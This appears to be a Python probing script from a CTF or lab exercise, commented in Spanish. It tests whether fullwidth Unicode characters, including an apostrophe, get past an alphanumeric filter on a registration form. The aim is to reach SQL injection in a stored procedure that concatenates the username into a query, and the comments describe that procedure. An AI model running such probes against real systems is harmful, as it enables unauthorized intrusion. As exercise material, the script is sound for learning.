#!/usr/bin/env python3
"""
Bugs específicos de MySQL/MariaDB con stored procedures
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

print(f"[*] Usuario: {username}:{password}\n")

# El procedimiento searchUser hace:
# SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', name, '\'');
# PREPARE stmt FROM @sql;
# EXECUTE stmt;

# ¿Qué pasa si registro un usuario con nombre que contiene caracteres especiales
# que register.php NO filtre bien?

# register.php línea 8: $name = preg_replace('/[^a-zA-Z0-9]/', '', $name);
# Esto elimina TODO excepto alfanuméricos

# PERO... ¿qué pasa con caracteres Unicode que se ven como alfanuméricos?

# Caracteres fullwidth que parecen ASCII:
fullwidth_chars = {
    'A': '\uff21',  # Fullwidth A
    'a': '\uff41',  # Fullwidth a
    '0': '\uff10',  # Fullwidth 0
    "'": '\uff07',  # Fullwidth apostrophe
    ';': '\uff1b',  # Fullwidth semicolon
}

# Intentar registrar con nombres Unicode
print("[*] Intentando registrar con caracteres Unicode...")

test_names = [
    "test\uff07",  # test con fullwidth apostrophe
    "te\uff53t",  # test con fullwidth s
    "TEST\uff21",  # TEST con fullwidth A
]

for name in test_names:
    s = requests.Session()
    u = random_string()
    p = random_string()
    
    print(f"[*] Intentando nombre: {repr(name)}")
    data_reg = {
        'name': name,
        'username': u,
        'password': p
    }
    
    try:
        resp = s.post(f"{TARGET}/register.php", data=data_reg, timeout=5)
        if "successfully" in resp.text.lower() or resp.status_code == 302:
            print(f"    [+] Registro aceptado")
            
            # Login
            resp2 = s.post(f"{TARGET}/login.php", data={'username': u, 'password': p}, timeout=5)
            if resp2.status_code == 302:
                print(f"    [+] Login exitoso")
                
                # Ver nombre
                resp3 = s.get(f"{TARGET}/", timeout=5)
                import re
                match = re.search(r'Yo, ([^<]+)</h2>', resp3.text)
                if match:
                    actual_name = match.group(1)
                    print(f"    [*] Nombre en BD: {repr(actual_name)}")
                    
                    if actual_name != name:
                        print(f"    [!] El nombre fue modificado!")
        else:
            print(f"    [-] Registro rechazado")
    except Exception as e:
        print(f"    [!] Exception: {e}")
